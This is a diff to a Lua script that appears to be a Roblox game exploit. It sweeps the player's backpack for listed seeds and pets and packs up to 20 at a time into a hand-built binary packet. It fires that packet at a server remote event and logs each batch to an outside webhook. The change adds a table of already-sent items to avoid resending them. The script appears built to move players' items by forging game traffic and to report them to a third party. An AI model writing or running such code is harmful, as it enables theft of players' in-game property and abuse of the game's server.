@@ -50,38 +50,42 @@ local function buildItemBlock(itemKey, count, category)
     return "\x1C" .. itemKeyHeader .. itemKeyValue .. countHeader .. countValue .. categoryHeader .. categoryValue
 end
 
+-- Tracks already processed unique item instances in this execution run to avoid duplicate spamming
+local sentItems = {}
+
 -- Core Execution Queue loop
 while true do
     local items = backpack:GetChildren()
     local selectedQueue = {}
 
-    -- Scan backpack for target matching items
+    -- Scan backpack for targets
     for _, item in ipairs(items) do
-        if #selectedQueue >= 20 then break end -- Batch limit (max 20)
+        if #selectedQueue >= 20 then break end -- Max batch size is 20
         
-        local isSeed = item:GetAttribute("MainCategory") == "Seed"
-        if isSeed then
-            local seedName = item:GetAttribute("SeedTool")
-            local count = item:GetAttribute("Count") or 1
-            if seedName and seedLookup[string.lower(seedName)] then
-                table.insert(selectedQueue, {
-                    ItemInstance = item,
-                    Key = seedName,
-                    Count = count,
-                    Category = "Seeds"
-                })
-            end
-        else
-            local petName = item:GetAttribute("Pet")
-            local petId = item:GetAttribute("PetId")
-            if petName and petId and petLookup[string.lower(petName)] then
-                -- Pets do not stack, count is always 1
-                table.insert(selectedQueue, {
-                    ItemInstance = item,
-                    Key = "$" .. petId,
-                    Count = 1,
-                    Category = "Pets"
-                })
+        if not sentItems[item] then
+            local isSeed = item:GetAttribute("MainCategory") == "Seed"
+            if isSeed then
+                local seedName = item:GetAttribute("SeedTool")
+                local count = item:GetAttribute("Count") or 1
+                if seedName and seedLookup[string.lower(seedName)] then
+                    table.insert(selectedQueue, {
+                        ItemInstance = item,
+                        Key = seedName,
+                        Count = count,
+                        Category = "Seeds"
+                    })
+                end
+            else
+                local petName = item:GetAttribute("Pet")
+                local petId = item:GetAttribute("PetId")
+                if petName and petId and petLookup[string.lower(petName)] then
+                    table.insert(selectedQueue, {
+                        ItemInstance = item,
+                        Key = "$" .. petId,
+                        Count = 1,
+                        Category = "Pets"
+                    })
+                end
             end
         end
     end
@@ -100,7 +104,7 @@ while true do
         if idx == 1 then
             dynamicPayload = itemBlock
         else
-            -- \x00\x05 followed by item index index byte separates subsequent items
+            -- \x00\x05 followed by item index separating subsequent items
             dynamicPayload = dynamicPayload .. "\x00\x05" .. string.char(idx) .. itemBlock
         end
     end
@@ -120,15 +124,15 @@ while true do
         Event:FireServer(buffer.fromstring(finalPayload))
     end
 
-    -- Construct logs & cleanup
+    -- Construct logs & mark items as sent
     local logLines = {}
     for _, itemData in ipairs(selectedQueue) do
         table.insert(logLines, string.format("• %s (x%d) bundled.", itemData.ItemInstance.Name, itemData.Count))
-        itemData.ItemInstance:Destroy() -- Client cosmetic update
+        sentItems[itemData.ItemInstance] = true
     end
     
     sendWebhook("⚡ **Batch Fired (" .. #selectedQueue .. " items in 1 packet)**:\n" .. table.concat(logLines, "\n"))
 
-    -- Wait 10 seconds before sweeping the next batch of 20
+    -- Immediately sweep next batch if there are still items left, otherwise complete loop
     task.wait(10)
 end
